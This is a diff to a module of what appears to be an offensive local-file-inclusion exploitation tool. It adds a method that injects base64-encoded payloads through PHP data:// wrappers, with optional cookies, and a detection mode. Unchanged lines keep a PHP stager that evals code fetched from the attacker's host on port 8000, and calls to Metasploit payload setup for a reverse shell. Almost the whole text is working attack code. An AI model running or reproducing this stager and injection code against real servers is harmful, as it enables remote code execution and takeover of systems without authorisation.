@@ -5,18 +5,36 @@ from urllib.parse import quote
 
 from .utils import listener, attack, colors, cook, msf_payload
 
+from .Detection import Detection
+
 STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 HERE = abspath(dirname(__file__))
 
 
 class Data:
-    def __init__(self, target, nostager, cookies):
+    def __init__(self, args):
 
-        self.target = target
-        self.nostager = nostager
-        self.cookies = cookies
+        self.target = args.url
+        self.nostager = args.nostager
+        self.cookies = args.cookies
+        self.detection = args.detection
+
+    def attack(self, payload):
+        encoded_payload = quote(codecs.encode(payload.encode("utf-8"), "base64"))
+        data_wrapper = "data://text/html;base64,{0}".format(encoded_payload)
+
+        if self.cookies:
+            cookies = cook(self.cookies)
+            response = attack(self.target, data_wrapper, cookies=cookies)
+        else:
+            response = attack(self.target, data_wrapper)
+        return response
 
     def execute_data(self):
+        if self.detection:
+            detector = Detection(self, Data)
+            detector.detect()
+            return
 
         lhost, lport, shell = msf_payload()
         file  = join(HERE, "Server.py")
